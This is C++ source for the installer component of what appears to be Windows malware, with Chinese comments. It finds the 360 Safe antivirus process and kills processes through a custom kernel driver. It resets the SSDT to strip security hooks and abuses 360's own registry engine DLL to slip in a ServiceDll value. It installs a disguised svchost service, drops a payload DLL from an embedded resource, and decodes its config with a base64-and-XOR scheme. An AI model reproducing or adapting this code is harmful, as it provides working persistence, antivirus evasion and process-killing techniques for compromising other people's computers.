// MyCommon.cpp: implementation of the MyCommon class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MyCommon.h"
#include "resetssdt.h"
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char MyCommon::EncodeString[MAX_CONFIG_LEN] = {0};
char MyCommon::ServiceConfig[MAX_CONFIG_LEN] = {0};
char MyCommon::base64[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
HWND MyCommon::hWnd = NULL;
pGetInterfaceInfo MyCommon::MyGetInterfaceInfo = NULL;
pAddIPAddress MyCommon::MyAddIPAddress;

MyCommon::MyCommon(){}

MyCommon::~MyCommon(){}

DWORD MyCommon::GetProcessID(char *lpProcessName)
{
	DWORD RetProcessID = 0;
	HANDLE handle = NULL;
	PROCESSENTRY32* info=new PROCESSENTRY32;
	info->dwSize=sizeof(PROCESSENTRY32);
	handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if(Process32First(handle,info))
	{
		if (strncmp(ToLower(info->szExeFile),ToLower(lpProcessName),lstrlen(lpProcessName)) == 0)
		{
			RetProcessID = info->th32ProcessID;
			return RetProcessID;
		}
		while(Process32Next(handle,info) != FALSE)
		{
			if (strncmp(ToLower(info->szExeFile),ToLower(lpProcessName),lstrlen(lpProcessName)) == 0)
			{
				RetProcessID = info->th32ProcessID;
				return RetProcessID;
			}
		}
	}
	return RetProcessID;
}

BOOL MyCommon::Stop360( char *IPADDR )
{
	DWORD dwRet=0;   
	PIP_INTERFACE_INFO plfTable=NULL;
	IP_ADAPTER_INDEX_MAP AdaptMap;
	DWORD dwBufferSize=0;
	TCHAR szFriendName[256]={0};
	DWORD tchSize=sizeof(TCHAR)*256;
	
	ULONG NTEContext   =   0;
	ULONG NTEInstance=0;
	IPAddr NewIP;
	IPAddr NewMask;
	dwRet = MyGetInterfaceInfo(NULL,&dwBufferSize);   
	if(dwRet==ERROR_INSUFFICIENT_BUFFER)   
	{
		plfTable=(PIP_INTERFACE_INFO)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,dwBufferSize);
		MyGetInterfaceInfo(plfTable,&dwBufferSize);
	}
	NewIP   =   inet_addr( IPADDR );
	NewMask   =   inet_addr("255.255.255.0");

	AdaptMap=plfTable->Adapter[0];//i是第几块网卡
	dwRet = MyAddIPAddress( NewIP, NewMask, AdaptMap.Index, &NTEContext, &NTEInstance );

	HeapFree(GetProcessHeap(),HEAP_ZERO_MEMORY,plfTable);
	return TRUE;

}

BOOL MyCommon::DevKillPro(DWORD Pid)
{
	if ( Pid == 0 ) return FALSE;
	HANDLE hDriver = CreateFile( "\\\\.\\MYDRIVERDOS", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
	if ( hDriver == INVALID_HANDLE_VALUE ) return FALSE;
	MYDATA data;
	data.Pid = Pid;
	data.Pid ^= XorValue;
	data.ModuleAddress = (ULONG)GetModuleHandle("ntdll.dll");
	DeviceIoControl( hDriver, IOCTL_KILL, &data, sizeof(MYDATA), NULL, 0, NULL, NULL );
	CloseHandle(hDriver);
	return TRUE;
}

BOOL MyCommon::DevRunning()
{
	HANDLE hDriver = CreateFile( "\\\\.\\MYDRIVERDOS", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
	if ( hDriver != INVALID_HANDLE_VALUE )
	{
		CloseHandle(hDriver);
		return TRUE;
	}
	return FALSE;
}

BOOL MyCommon::StopService(LPCTSTR lpService)
{
	SC_HANDLE        schSCManager;
	SC_HANDLE        schService;
	SERVICE_STATUS   RemoveServiceStatus;
	
	schSCManager=::OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
	if (schSCManager!=NULL)
	{
		schService=::OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄
		if (schService!=NULL)
		{
			if(QueryServiceStatus(schService,&RemoveServiceStatus)!=0)
			{
				if(RemoveServiceStatus.dwCurrentState!=SERVICE_STOPPED)//停止服务
				{
					if(ControlService(schService,SERVICE_CONTROL_STOP,&RemoveServiceStatus)!=0)
					{
						while(RemoveServiceStatus.dwCurrentState==SERVICE_STOP_PENDING)         
						{
							Sleep(10);
							QueryServiceStatus(schService,&RemoveServiceStatus);
						}
					}
				}
			}    
			CloseServiceHandle(schService);
		}	
		::CloseServiceHandle(schSCManager);
	}
	else 
		return FALSE;
	
	return TRUE;
}

void MyCommon::StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, SERVICE_ALL_ACCESS );
		if ( NULL != hService )
		{
			ChangeServiceConfig( hService, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE,NULL, NULL, NULL, NULL, NULL, NULL, NULL);
			::StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

void MyCommon::ReSSDTR0()
{
	HANDLE hDriver = CreateFile( "\\\\.\\MYDRIVERDOS", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL );
	if ( hDriver != INVALID_HANDLE_VALUE )
	{
		HMODULE    hKernel;
		DWORD    dwKSDT;                // rva of KeServiceDescriptorTable
		DWORD    dwKiServiceTable;    // rva of KiServiceTable
		PMODULES    pModules=(PMODULES)&pModules;
		DWORD    dwNeededSize,rc;
		DWORD    dwKernelBase,dwServices=0;
		PCHAR    pKernelName;
		PDWORD    pService;
		PIMAGE_FILE_HEADER    pfh;
		PIMAGE_OPTIONAL_HEADER    poh;
		PIMAGE_SECTION_HEADER    psh;
		
		FARPROC NtQuerySystemInformationAddr = (FARPROC)GetProAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");
		// get system modules - ntoskrnl is always first there
		rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,4,&dwNeededSize);
		if (rc==STATUS_INFO_LENGTH_MISMATCH) {
			pModules=(MODULES *)GlobalAlloc(GPTR,dwNeededSize);
			rc=((PFNNtQuerySystemInformation)NtQuerySystemInformationAddr)(11,pModules,dwNeededSize,NULL);
		} else {
strange:
		return;
		}
		if (!NT_SUCCESS(rc)) goto strange;
		
		// imagebase
		dwKernelBase=(DWORD)pModules->smi.Base;
		// filename - it may be renamed in the boot.ini
		pKernelName=pModules->smi.ModuleNameOffset+pModules->smi.ImageName;
		
		// map ntoskrnl - hopefully it has relocs
		SC_HANDLE hSCM =  OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE );
		hKernel=LoadLibraryEx(pKernelName,0,DONT_RESOLVE_DLL_REFERENCES);
		CloseServiceHandle(hSCM);
		if (!hKernel) return;
		GlobalFree(pModules);
		// our own export walker is useless here - we have GetProcAddress :)    
		if (!(dwKSDT=(DWORD)GetProAddress(hKernel,"KeServiceDescriptorTable"))) {
			return;
		}
		// get KeServiceDescriptorTable rva
		dwKSDT-=(DWORD)hKernel;    
		// find KiServiceTable
		if (!(dwKiServiceTable = FindKiServiceTable(hKernel,dwKSDT))) {
			return;
		}
		// let's dump KiServiceTable contents        
		// MAY FAIL!!!
		// should get right ServiceLimit here, but this is trivial in the kernel mode
		GetHeaders((PCHAR)hKernel,&pfh,&poh,&psh);
		for (pService=(PDWORD)((DWORD)hKernel+dwKiServiceTable);
		*pService-poh->ImageBase<poh->SizeOfImage;
		pService++,dwServices++)
		{
			ULONG ulAddr=*pService-poh->ImageBase+dwKernelBase;
			SetProc( hDriver,dwServices, &ulAddr );	    
		}
		FreeLibrary(hKernel);

		CloseHandle(hDriver);
	}
}

LPBYTE MyCommon::FindConfigString( WORD wResourceID, LPCTSTR lpType )
{
	LPBYTE Ret = NULL;
	HGLOBAL hRes;
	HRSRC hResInfo;
	DWORD Res_Size = 0;
	hResInfo = FindResource( NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return NULL;
	hRes = LoadResource( NULL, hResInfo);
	if (hRes == NULL) return NULL;
	Res_Size = SizeofResource(NULL, hResInfo);
	Ret = new BYTE[Res_Size+1];
	memset( Ret, 0, Res_Size+1 );
	memcpy( Ret, hRes, Res_Size );
	FreeResource(hRes);
	return Ret;
}

int MyCommon::memfind(const char *mem, const char *str, int sizem, int sizes)
{
	int   da,i,j;
	if (sizes == 0) da = lstrlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}
	return -1;   
}

int MyCommon::pos(char c)
{
	char *p;
	for(p = base64; *p; p++)
		if(*p == c)
			return p - base64;
		return -1;
}

int MyCommon::base64_decode(const char *str, char **data)
{
	const char *s, *p;
	unsigned char *q;
	int c;
	int x;
	int done = 0;
	int len;
	s = (const char *)malloc(strlen(str));
	q = (unsigned char *)s;
	for(p=str; *p && !done; p+=4){
		x = pos(p[0]);
		if(x >= 0)
			c = x;
		else{
			done = 3;
			break;
		}
		c*=64;
		
		x = pos(p[1]);
		if(x >= 0)
			c += x;
		else
			return -1;
		c*=64;
		
		if(p[2] == '=')
			done++;
		else{
			x = pos(p[2]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		c*=64;
		
		if(p[3] == '=')
			done++;
		else{
			if(done)
				return -1;
			x = pos(p[3]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		if(done < 3)
			*q++=(c&0x00ff0000)>>16;
		
		if(done < 2)
			*q++=(c&0x0000ff00)>>8;
		if(done < 1)
			*q++=(c&0x000000ff)>>0;
	}
	
	len = q - (unsigned char*)(s);
	
	*data = (char*)realloc((void *)s, len);
	
	return len;
}

char* MyCommon::MyDecode(char *str)
{
	int		i = 0, len = 0;
	char	*data = NULL;
	len = base64_decode(str, &data);
	
	while( i < len )
	{
		data[i] -= 0x6;
		data[i] ^= 0x12;
		i++;
	}

/*
	for (i = 0; i < len; i++)
	{
		data[i] -= 0x6;
		data[i] ^= 0x12;
	}
*/
	return data;
}

BOOL MyCommon::ReleaseResource( WORD wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString )
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	hResInfo = FindResource( NULL, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL) return FALSE;
	hRes = LoadResource( NULL, hResInfo);
	if (hRes == NULL) return FALSE;
	hFile = CreateFile
		(
		lpFileName, 
		GENERIC_READ|GENERIC_WRITE,
		NULL,//独占
		NULL,
		CREATE_ALWAYS,//存在时覆盖原有文件
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if (hFile == NULL) return FALSE;

	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	// 写入配置
	if (lpConfigString != NULL)
	{
		WriteFile(hFile, lpConfigString, lstrlen(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	FreeResource(hRes);
//	SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
	return TRUE;
}

LPCTSTR MyCommon::InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString)
{
	char *RetName = NULL;
	char *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
	char *bin = "%SystemRoot%\\System32\\svchost.exe -k Kernels";
	char *InstallName = new char[24];
	char strSubKey[1024] = "SYSTEM\\CurrentControlSet\\Services\\";
	__asm nop;
	char DllPath[MAX_PATH], ReadBuffer[1024];
	HKEY hKey = NULL;
	SC_HANDLE hSCM = NULL,hService = NULL;
	DWORD dwDisposition, type, size = sizeof(ReadBuffer);
	memset( InstallName, 0, 24 );
	wsprintf( InstallName, "F%08dK", GetTickCount() );
	__try
	{
		hSCM = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS );
		if (!hSCM) __leave;
		if ( RegOpenKeyEx( HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_READ|KEY_WRITE, &hKey ) != 0 ) __leave;
		if ( RegQueryValueEx( hKey, "Kernels", 0, &type, (LPBYTE)ReadBuffer, &size ) == 0 )
		{
			hService = OpenService( hSCM, ReadBuffer, SERVICE_ALL_ACCESS );
			if (hService)
			{
				DeleteService(hService);
				CloseServiceHandle(hService);
				hService = NULL;
			}
		}
		if ( RegSetValueEx( hKey, "Kernels", 0, REG_MULTI_SZ, (LPBYTE)InstallName, lstrlen(InstallName) + 1 ) != 0 ) __leave;
//		RegCloseKey(hKey);
		hService = CreateService( hSCM,
								InstallName,
								lpServiceDisplayName,
								SERVICE_ALL_ACCESS,
								SERVICE_WIN32_OWN_PROCESS,
								SERVICE_DISABLED,//禁用，后面再启用
								SERVICE_ERROR_NORMAL,
								bin, NULL, NULL, NULL, NULL, NULL );
		if (!hService) __leave;
		lstrcat( strSubKey, InstallName );
		if ( RegCreateKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition ) == 0 )
		{
			RegCloseKey(hKey);
		}
		if ( RegOpenKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, KEY_READ|KEY_WRITE, &hKey ) != 0 ) __leave;
		if ( RegSetValueEx( hKey, "Description", 0, REG_SZ, (LPBYTE)lpServiceDescription, lstrlen(lpServiceDescription) + 1 ) != 0 ) __leave;
		RegCloseKey(hKey);
		lstrcat( strSubKey, "\\Parameters");
		GetSystemDirectory( DllPath, sizeof(DllPath) );
		lstrcat( DllPath, "\\" );
		lstrcat( DllPath, InstallName );
		lstrcat( DllPath, ".cmd" );
		if ( RegCreateKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition ) == 0 )
		{
			RegCloseKey(hKey);
		}
		if ( !Use360Fun( strSubKey, "ServiceDll", DllPath ) )
		{
			if ( RegOpenKeyEx( HKEY_LOCAL_MACHINE, strSubKey, 0, KEY_READ|KEY_WRITE, &hKey ) != 0 ) __leave;
			if ( RegSetValueEx( hKey, "ServiceDll", 0, REG_EXPAND_SZ, (LPBYTE)DllPath, lstrlen(DllPath) + 1 ) != 0 ) __leave;
		}
		//释放文件，留空暂定
		ReleaseResource( IDR_DLL, "HACKFANS", DllPath, lpConfigString );
		RetName = InstallName;
	}
	__finally
	{
		if (hKey) RegCloseKey(hKey);
		if (hService) CloseServiceHandle(hService);
		if (hSCM) CloseServiceHandle(hSCM);
	}
	return RetName;
}

BOOL MyCommon::Use360Fun( char *SubKey, char *ValueName, char *Buff )
{
	BOOL Ret = FALSE;
	DWORD Pid_360 = 0;
	HANDLE hPro = NULL;
	char FullPath[MAX_PATH];
	char *pos = NULL;
	HMODULE hModule = NULL;
	HKEY hKey = NULL;
	pGetModuleFileNameExA MyGetModuleFileNameEx = NULL;
	__try
	{
		Pid_360 = GetProcessID("360tray.exe");
		if ( Pid_360 == 0 ) __leave;
		hPro = OpenProcess( PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, Pid_360 );
		if (!hPro) __leave;
		MyGetModuleFileNameEx = (pGetModuleFileNameExA)GetProcAddress( LoadLibrary("psapi.dll"), "GetModuleFileNameEx" );
		if ( !MyGetModuleFileNameEx ) __leave;
		MyGetModuleFileNameEx( hPro, 0, FullPath, sizeof(FullPath) );
		if ( lstrlen(FullPath) == 0 ) __leave;
		ToLower(FullPath);
		if ( strstr( FullPath, "\\safemon\\" ) == NULL ) __leave;
		pos = strstr( FullPath, "safemon\\360tray.exe" );
		if ( pos == NULL ) __leave;
		*pos = '\0';
		lstrcat( FullPath, "deepscan\\bregdll.dll" );
		if ( GetFileAttributes(FullPath) == -1 ) __leave;
		hModule = LoadLibrary(FullPath);
		if (!hModule) __leave;
		INIT_REG_ENGINE InitRegEngine = (INIT_REG_ENGINE)GetProcAddress( hModule, "InitRegEngine");
		BREG_OPEN_KEY BRegOpenKey = (BREG_OPEN_KEY)GetProcAddress( hModule, "BRegOpenKey");
		BREG_CLOSE_KEY BRegCloseKey = (BREG_CLOSE_KEY)GetProcAddress( hModule, "BRegCloseKey");
		REG_SET_VALUE_EX BRegSetValueEx = (REG_SET_VALUE_EX)GetProcAddress( hModule, "BRegSetValueEx");
		if ( !InitRegEngine || !BRegOpenKey || !BRegCloseKey || !BRegSetValueEx ) __leave;
		if ( !InitRegEngine() ) __leave;
		if ( BRegOpenKey( HKEY_LOCAL_MACHINE, SubKey, &hKey) < 0 ) __leave;
		if ( BRegSetValueEx(hKey, ValueName, NULL, REG_EXPAND_SZ, (LPBYTE)Buff, lstrlen(Buff)+1 ) < 0 ) __leave;
		BRegCloseKey(hKey);
		hKey = NULL;
		Ret = TRUE;
	}
	__finally
	{
		FreeLibrary(hModule);
		if (hPro) CloseHandle(hPro);
		return Ret;
	}
	return Ret;
}

char* MyCommon::ToLower(char s[])
{
	int i = 0;
	while(s[i] != '\0' )
	{ 
		// 判断是否是小写字母 
		if(s[i] >= 'A' && s[i] <= 'Z' ) 
			s[i] += 32;     // 小写字母比大写字母的 ASCII 大 32 
		i++;
	}
	return s;
}

BOOL MyCommon::GetAddr()
{
	HMODULE hIphlpapi = LoadLibrary("iphlpapi.dll");
	if (!hIphlpapi) return FALSE;
	MyGetInterfaceInfo = (pGetInterfaceInfo)GetProAddress( hIphlpapi, "GetInterfaceInfo" );
	if (!MyGetInterfaceInfo) return FALSE;
	MyAddIPAddress = (pAddIPAddress)GetProAddress( hIphlpapi, "AddIPAddress" );
	if (!MyAddIPAddress) return FALSE;

	return TRUE;
}

int Mystrcmp(const char *cs, const char *ct)
{
	signed char __res;
	while (1) {
		if ((__res = *cs - *ct++) != 0 || !*cs++)
			break;
	}
	return __res;
}

DWORD MyCommon::GetProAddress( HMODULE phModule,char* pProcName )
{
	if (!phModule) return 0;
	PIMAGE_DOS_HEADER pimDH = (PIMAGE_DOS_HEADER)phModule;
	PIMAGE_NT_HEADERS pimNH = (PIMAGE_NT_HEADERS)((char*)phModule+pimDH->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pimED = (PIMAGE_EXPORT_DIRECTORY)((DWORD)phModule+pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	DWORD pExportSize = pimNH->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
	DWORD pResult = 0;
	
	if ((DWORD)pProcName < 0x10000)
	{
		if ((DWORD)pProcName >= pimED->NumberOfFunctions+pimED->Base || (DWORD)pProcName < pimED->Base) return 0;
		pResult = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[(DWORD)pProcName-pimED->Base];
	}
	else
	{
		DWORD* pAddressOfNames = (DWORD*)((DWORD)phModule+pimED->AddressOfNames);
		for (unsigned long i=0;i < pimED->NumberOfNames ; i++)
		{
			char* pExportName = (char*)(pAddressOfNames[i]+(DWORD)phModule);
			if (Mystrcmp(pProcName,pExportName) == 0)
			{
				WORD* pAddressOfNameOrdinals = (WORD*)((DWORD)phModule+pimED->AddressOfNameOrdinals);
				pResult  = (DWORD)phModule+((DWORD*)((DWORD)phModule+pimED->AddressOfFunctions))[pAddressOfNameOrdinals[i]];
				break;
			}
		}
	}
	if (pResult != 0 && pResult >= (DWORD)pimED && pResult < (DWORD)pimED+pExportSize)
	{
		char* pDirectStr = (char*)pResult;
		bool pstrok = false;
		while (*pDirectStr)
		{
			if (*pDirectStr == '.')
			{
				pstrok = true;
				break;
			}
			pDirectStr++;
		}
		if (!pstrok) return 0;
		char pdllname[MAX_PATH];
		int  pnamelen = pDirectStr - (char*)pResult;
		if (pnamelen <= 0) return 0;
		memcpy(pdllname,(char*)pResult,pnamelen);
		pdllname[pnamelen] = 0;
		HMODULE phexmodule = GetModuleHandle(pdllname);
		pResult = GetProAddress(phexmodule,pDirectStr+1);
	}
	return pResult;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	switch (message)
	{
	case WM_DESTROY:
		PostQuitMessage(wParam);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

HWND MyCommon::MyCreateWindow( LPCTSTR szWindowClass )
{
	if (hWnd) return hWnd;
	HINSTANCE SelfHin = GetModuleHandle(NULL);
	MSG msg;
	WNDCLASSEX wcex;
	memset( &wcex, 0, sizeof(WNDCLASSEX) );
	wcex.cbSize = sizeof(WNDCLASSEX);
	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= (WNDPROC)WndProc;
	//	wcex.cbClsExtra		= 0;
	//	wcex.cbWndExtra		= 0;
	wcex.hInstance		= SelfHin;
	wcex.hIcon			= LoadIcon( NULL, IDI_WINLOGO );
	wcex.hCursor		= LoadCursor( NULL, IDC_ARROW );
	wcex.hbrBackground	= (HBRUSH)COLOR_WINDOW;
	//	wcex.lpszMenuName	= NULL;
	wcex.lpszClassName	= szWindowClass;
	//	wcex.hIconSm		= NULL;
	RegisterClassEx(&wcex);
	
	hWnd = CreateWindow( szWindowClass, "", WS_OVERLAPPEDWINDOW, 0, 0, 200, 200, NULL, NULL, SelfHin, NULL);
	
	if (hWnd)
	{
		ShowWindow(hWnd, SW_NORMAL);
		UpdateWindow(hWnd);
		SendMessage( hWnd, WM_SYSCOMMAND, SC_MINIMIZE, NULL );
		while (GetMessage(&msg, NULL, 0, 0)) 
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}
}